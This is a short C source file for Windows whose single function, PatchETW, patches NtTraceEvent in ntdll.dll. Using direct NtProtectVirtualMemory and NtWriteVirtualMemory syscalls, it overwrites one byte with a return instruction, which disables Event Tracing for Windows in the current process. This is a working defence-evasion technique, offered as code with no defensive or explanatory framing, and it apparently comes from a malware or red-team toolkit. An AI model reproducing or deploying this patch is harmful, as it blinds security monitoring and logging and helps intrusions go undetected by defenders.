#include <Windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "patch.h"

BOOL PatchETW() {
    HANDLE hDll = GetModuleHandleA("ntdll.dll");

    if (hDll != 0) {

        CHAR* address = GetProcAddress(hDll, "NtTraceEvent");

        if (address != 0) {
            CHAR* addr_offset = address + 3;
            CHAR* addr_offset_bak = addr_offset;
            PVOID buffer = "\xc3";
            HANDLE hProc = GetCurrentProcess();
            PSIZE_T length = 1;
            PULONG dwOld = 0;

            //printf("NtTraceEvent is at 0x%p\n", addr_offset);

            NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &addr_offset, &length, PAGE_EXECUTE_READWRITE, &dwOld);
            //getchar();

            NTSTATUS NTWVM = NtWriteVirtualMemory(hProc, addr_offset_bak, buffer, 1, NULL);

            //getchar();
            NTSTATUS NTPVM_bak = NtProtectVirtualMemory(hProc, &addr_offset_bak, &length, dwOld, &dwOld);
            CloseHandle(hProc);
        }
    }
    else {
        //printf("Error\n");
        return 0;
    }

    CloseHandle(hDll);
    return 1;
}
